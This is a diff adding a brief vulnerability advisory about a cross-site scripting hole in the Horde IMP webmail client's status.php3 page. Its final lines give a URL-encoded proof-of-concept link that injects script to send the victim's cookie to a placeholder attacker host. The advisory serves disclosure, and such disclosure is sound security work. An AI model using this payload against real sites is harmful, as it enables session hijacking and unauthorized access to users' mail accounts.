@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/3525/info
+
+IMP is a powerful web-based mail interface/client developed by members of the Horde project.
+
+Encoded HTML tags are not stripped from requests to access 'status.php3'. It is possible for a remote attacker to construct a link which when clicked will cause arbitrary script code to be executed in the browser of an unsuspecting user in the context of a site running Horde IMP.
+
+As a result, it has been proven that this issue can be exploited to steal a legitimate user's cookie-based authentication credentials and gain unauthorized access to that user's webmail account. 
+
+http://myimp.site.com/status.php3?message=%3Cscript%20language%3Djavascript
+%3E%20document.write(%27%3Cimg%20src%3Dhttp%3A%2F%2Fattackerhost.co
+m%2Fcookie.cgi%3Fcookie%3D%27%20%2B%20escape(document.cookie)%2B%
+20%27%3E%27)%3B%3C%2Fscript%3E%0A 
